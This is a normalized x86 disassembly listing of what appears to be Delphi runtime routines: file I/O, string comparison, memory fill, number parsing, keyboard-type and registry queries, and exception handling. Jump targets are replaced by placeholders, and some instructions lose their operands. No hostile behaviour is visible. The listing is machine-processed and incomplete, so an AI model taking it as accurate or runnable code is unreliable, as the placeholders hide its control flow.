cmp edi ebx
ja r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
push ebx
call sub_3a61274
mov ebx eax
jmp r-xdata
push ebx
call sub_3a61274
mov edi eax
cmp edi ebx
jbe r-xdata
movzx eax [ ebx ]
mov [ ebp + esi ] al
inc ebx
inc esi
cmp edi ebx
ja r-xdata
sub_3a63350
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_3a652a0
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_3a612dc
mov ecx eax
mov edx esp
mov eax ebx
call sub_3a65390
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_3a63254
mov edi eax
test esi esi
je r-xdata
sub_3a633b0
add esp 0xfffffff8
push esp
call QueryPerformanceCounter
test eax eax
je r-xdata
call sub_3a61394
mov [ rw-data ] eax
pop ecx
pop edx
retn
mov eax [ esp ]
mov [ rw-data ] eax
pop ecx
pop edx
retn
sub_3a63424
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_3a63464
push ebx
push esi
mov esi edx
mov ebx eax
movzx eax [ ebx + 0x4 ]
cmp ax 0xd7b0
jb r-xdata
mov ebx 0x66
jmp r-xdata
cmp ax 0xd7b3
jbe r-xdata
test ebx ebx
je r-xdata
cmp ax 0xd7b0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ebx
call sub_3a6305c
mov [ ebx + 0x4 ] si
cmp [ ebx + 0x48 ] 0x0
jne r-xdata
mov eax ebx
call sub_3a638ac
mov eax ebx
call [ ebx + 0x18 ]
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov [ ebx + 0x18 ] sub_3a63580
sub_3a634d4
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx ]
push eax
call sub_3a61244
test eax eax
jne r-xdata
xor eax eax
call sub_3a612cc
cmp eax 0x6d
jne r-xdata
pop ebx
retn
xor eax eax
pop ebx
retn
sub_3a63514
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
test esi esi
jne r-xdata
push 0x0
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx ]
push eax
call sub_3a6126c
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
call sub_3a612cc
jmp r-xdata
pop edx
pop esi
pop ebx
retn
xor edx edx
mov [ ebx + 0xc ] edx
sub_3a63560
push ebx
mov ebx eax
mov [ ebx + 0x4 ] 0xd7b0
mov eax [ ebx ]
call sub_3a63550
test al al
jne r-xdata
xor eax eax
pop ebx
retn
call sub_3a612cc
pop ebx
retn
sub_3a63580
push esi
mov esi eax
xor eax eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov ax [ esi + 0x4 ]
sub eax 0xd7b1
je r-xdata
mov eax 0x80000000
mov edx 0x1
mov ecx 0x3
mov [ esi + 0x1c ] sub_3a634d4
jmp r-xdata
dec eax
je r-xdata
mov [ esi + 0x24 ] sub_3a63560
mov [ esi + 0x20 ] sub_3a63510
cmp [ esi + 0x48 ] 0x0
je r-xdata
mov eax 0x40000000
mov edx 0x1
mov ecx 0x2
jmp r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x14c ]
mov [ esi + 0x8 ] 0x80
mov [ esi + 0x24 ] sub_3a63510
mov [ esi + 0x14 ] eax
cmp [ esi + 0x4 ] 0xd7b2
je r-xdata
push 0x0
push 0x80
push ecx
push 0x0
push edx
push eax
lea eax [ esi + 0x48 ]
push eax
call sub_3a6121c
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x1c ] sub_3a63514
mov eax 0xc0000000
mov edx 0x1
mov ecx 0x3
jmp r-xdata
cmp esi rw-data
jne r-xdata
push 0xfffffff6
jmp r-xdata
mov [ esi + 0x4 ] 0xd7b0
call sub_3a612cc
jmp r-xdata
mov [ esi ] eax
cmp [ esi + 0x4 ] 0xd7b3
jne r-xdata
pop esi
retn
push 0xfffffff5
push 0xfffffff4
jmp r-xdata
call sub_3a61234
cmp eax 0xffffffff
je r-xdata
cmp [ esi + 0x4 ] 0xd7b1
je r-xdata
dec [ esi + 0x4 ]
push 0x0
push [ esi ]
call GetFileSize
inc eax
je r-xdata
mov [ esi ] eax
xor eax eax
push [ esi ]
call GetFileType
test eax eax
je r-xdata
sub eax 0x81
jae r-xdata
push [ esi ]
call sub_3a61214
mov [ esi + 0x4 ] 0xd7b0
mov eax 0x69
jmp r-xdata
cmp eax 0x2
jne r-xdata
push 0x0
push 0x0
push eax
push [ esi ]
call sub_3a6125c
inc eax
je r-xdata
xor eax eax
mov [ esi + 0x20 ] sub_3a63514
push 0x0
mov edx esp
push 0x0
push edx
push 0x80
lea edx [ esi + 0x14c ]
push edx
push [ esi ]
call sub_3a61244
pop edx
dec eax
jne r-xdata
xor eax eax
cmp [ esi + eax + 0x14c ] 0xe
je r-xdata
push 0x2
push 0x0
sub eax edx
push eax
push [ esi ]
call sub_3a6125c
inc eax
je r-xdata
inc eax
jmp r-xdata
push [ esi ]
call sub_3a61254
dec eax
jne r-xdata
cmp eax edx
jae r-xdata
jmp r-xdata
sub_3a6372c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
xor ecx ecx
mov edx 0x14c
call sub_3a63a44
lea eax [ ebx + 0x14c ]
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x4 ] 0xd7b0
movzx eax [ rw-data ]
mov [ ebx + 0x6 ] ax
mov [ ebx + 0x8 ] 0x80
mov [ ebx + 0x18 ] sub_3a63580
mov eax esi
call sub_3a65560
push eax
mov eax esi
call sub_3a65730
lea edx [ ebx + 0x48 ]
pop ecx
call sub_3a63154
mov eax esi
call sub_3a65560
mov [ ebx + eax + 0x48 ] 0x0
xor eax eax
pop esi
pop ebx
retn
sub_3a63794
push ebx
movzx ecx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_3a6305c
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_3a637fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0x10 ]
movzx edx [ ebx + 0x4 ]
and edx eax
cmp eax edx
jne r-xdata
mov eax 0x67
call sub_3a6305c
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
imul esi
push eax
push edi
mov eax [ ebx ]
push eax
call [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
xor edx edx
div ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
call sub_3a612cc
call sub_3a6305c
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov eax [ ebp + 0x8 ]
call sub_3a6305c
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_3a638ac
push ebx
push esi
mov ebx eax
xor esi esi
movzx eax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_3a6305c
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_3a6305c
jmp r-xdata
sub_3a63904
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_3a63934
push ebx
movzx ebx [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
movzx ecx cl
xchg edx eax
call sub_3a63154
pop ebx
retn
mov ecx ebx
sub_3a63950
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_3a639d4
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_3a63a44
cmp edx 0x20
mov ch cl
jl r-xdata
test edx edx
jle r-xdata
mov [ eax ] cx
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] cx
mov [ eax + 0x6 ] cx
sub edx 0x10
fld [ eax ]
fst [ edx + eax ]
fst [ edx + eax + 0x8 ]
mov ecx eax
and ecx 0x7
sub ecx 0x8
sub eax ecx
add edx ecx
add eax edx
neg edx
retn
mov [ edx + eax - 0x1 ] cl
and edx 0xfffffffe
neg edx
lea edx [ edx * 2 + r-xdata ]
jmp edx
fst [ edx + eax ]
fst [ edx + eax + 0x8 ]
add edx 0x10
jl r-xdata
ffree st0
retn
mov [ eax + 0x1c ] cx
mov [ eax + 0x1a ] cx
mov [ eax + 0x18 ] cx
mov [ eax + 0x16 ] cx
mov [ eax + 0x14 ] cx
mov [ eax + 0x12 ] cx
mov [ eax + 0x10 ] cx
mov [ eax + 0xe ] cx
mov [ eax + 0xc ] cx
mov [ eax + 0xa ] cx
mov [ eax + 0x8 ] cx
mov [ eax + 0x6 ] cx
mov [ eax + 0x4 ] cx
mov [ eax + 0x2 ] cx
mov [ eax ] cx
retn
sub_3a63ae0
push ebx
push esi
mov ebx eax
mov [ ebx + 0x4 ] 0xd7b0
xor esi esi
mov eax [ ebx ]
call sub_3a63550
test al al
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_3a6306c
mov esi 0x1
sub_3a63b08
push ebx
push esi
push edi
mov esi edx
mov edi ecx
xor edx edx
mov ebx eax
mov dx [ eax + 0x4 ]
sub edx 0xd7b0
je r-xdata
mov [ ebx + 0x4 ] 0xd7b3
mov [ ebx + 0x8 ] esi
mov [ ebx + 0x24 ] sub_3a63ae0
mov [ ebx + 0x1c ] sub_3a63510
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp edx 0x3
ja r-xdata
mov [ ebx + 0x24 ] sub_3a63510
cmp edi 0x3
je r-xdata
mov eax 0xc0000000
mov dl [ rw-data ]
and edx 0x70
shr edx 0x2
mov edx [ edx + rw-data ]
mov ecx 0x2
sub edi 0x3
je r-xdata
mov eax 0x66
jmp r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
push 0xfffffff5
push 0xfffffff6
jmp r-xdata
push 0x0
push 0x80
push ecx
push 0x0
push edx
push eax
lea eax [ ebx + 0x48 ]
push eax
call sub_3a6121c
mov ecx 0x3
inc edi
je r-xdata
call sub_3a6305c
call sub_3a6305c
cmp eax 0xffffffff
je r-xdata
call sub_3a61234
jmp r-xdata
mov [ ebx + 0x4 ] 0xd7b0
call sub_3a612cc
mov [ ebx ] eax
jmp r-xdata
mov eax 0x40000000
inc edi
mov [ ebx + 0x4 ] 0xd7b2
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax 0x80000000
mov [ ebx + 0x4 ] 0xd7b1
sub_3a63bf4
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_3a63cc8
push ebx
mov ebx eax
cmp ebx rw-data
je r-xdata
movzx eax [ rw-data ]
mov [ ebx + 0x6 ] ax
mov eax ebx
call sub_3a634bc
cmp ebx rw-data
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax 0x69
call sub_3a6305c
cmp [ ebx + 0x4 ] 0xd7b2
sete al
mov ebx eax
test bl bl
jne r-xdata
sub_3a63d0c
push esi
push edi
mov esi edx
cmp [ eax + 0x4 ] 0xd7b2
je r-xdata
mov edi [ eax + 0x14 ]
add edi [ eax + 0xc ]
mov edx [ eax + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx ecx
jg r-xdata
push eax
push edx
push ecx
call sub_3a63cc8
test al al
pop ecx
pop edx
pop eax
je r-xdata
add [ eax + 0xc ] ecx
[ edi ] [ esi ]
add [ eax + 0xc ] edx
sub ecx edx
push eax
push ecx
mov ecx edx
[ edi ] [ esi ]
call [ eax + 0x1c ]
test eax eax
jne r-xdata
pop edi
pop esi
retn
call sub_3a6305c
pop ecx
pop eax
pop edi
pop esi
retn
pop ecx
pop eax
jmp r-xdata
sub_3a63d60
mov ecx edx
test ecx ecx
jg sub_3a63d0c
sub ecx 0x40
push eax
push ecx
mov ecx 0x40
call sub_3a63d0c
call sub_3a672cc
cmp [ eax + 0x4 ] 0x0
jne r-xdata
retn
pop ecx
pop eax
retn
pop ecx
pop eax
jmp r-xdata
mov edx r-xdata
cmp ecx 0x40
jle r-xdata
sub_3a63ddc
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x6 ] 0x1
je r-xdata
mov [ esp ] 0xa
mov edx esp
mov eax ebx
mov ecx 0x1
call sub_3a63d0c
mov esi eax
mov [ esp ] 0xd
mov [ esp + 0x1 ] 0xa
mov edx esp
mov eax ebx
mov ecx 0x2
call sub_3a63d0c
mov esi eax
jmp r-xdata
mov eax ebx
call sub_3a637e8
mov eax esi
pop edx
pop esi
pop ebx
retn
sub_3a63e30
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_3a63e5c
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_3a63f0f ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_3a63f0f ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_3a63f0f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_3a64148
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_3a64178
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_3a61334
test eax eax
jne r-xdata
movzx eax [ rw-data ]
and ax 0xffc0
movzx edx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_3a641e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_3a6133c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_3a6132c
retn
sub_3a64274
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a642fb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax ebx
call sub_3a64260
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_3a65504
mov eax esi
call sub_3a65560
push eax
mov eax esi
call sub_3a65730
push eax
mov eax [ ebp - 0x4 ]
call sub_3a65560
push eax
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
push 0x1
push 0x800
call sub_3a6127c
cmp eax 0x2
sete bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a64302
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a6438c
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_3a643e4
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_3a65dec
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_3a64404
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_3a66ccc
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_3a64434
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_3a644b8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_3a644c8
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a644bf
lea eax [ ebp - 0x8 ]
call sub_3a66cb4
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_3a64404
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_3a66ccc
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_3a644c8
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_3a6450c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_3a645ac
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_3a6454c
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_3a6457c
push eax
push ecx
mov eax [ eax ]
call sub_3a6454c
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_3a651e0
call [ rw-data ]
sub_3a64594
push esi
mov esi edx
mov eax [ eax ]
call sub_3a6454c
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_3a651e0
call [ rw-data ]
sub_3a645dc
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_3a6454c
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_3a64604
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_3a64654
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_3a64694
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_3a646e4
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_3a6470d
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_3a6473c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_3a6476b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax [ ebp - 0x4 ]
pop [ fs : 0x0 ]
add esp 0x8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a647b8
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_3a647f4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_3a64808
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
